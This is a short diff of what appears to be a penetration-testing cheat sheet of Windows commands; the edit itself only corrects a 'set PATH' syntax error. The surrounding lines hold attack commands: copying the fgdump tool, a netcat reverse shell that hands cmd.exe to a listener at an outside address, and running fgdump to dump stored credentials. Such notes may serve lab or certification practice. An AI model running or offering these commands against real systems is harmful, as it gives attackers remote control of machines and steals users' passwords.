@@ -24,7 +24,7 @@ copy Z:\fgdump.exe
 nc.exe -nv 192.168.119.191 10000 -e cmd.exe
 
 # windows set PATH so that a certain command can be call within other dir
-set PATH%PATH%;C:\Windows\Temp
+set PATH=%PATH%;C:\Windows\Temp
 
 # dump credentials
 fgdump.exe
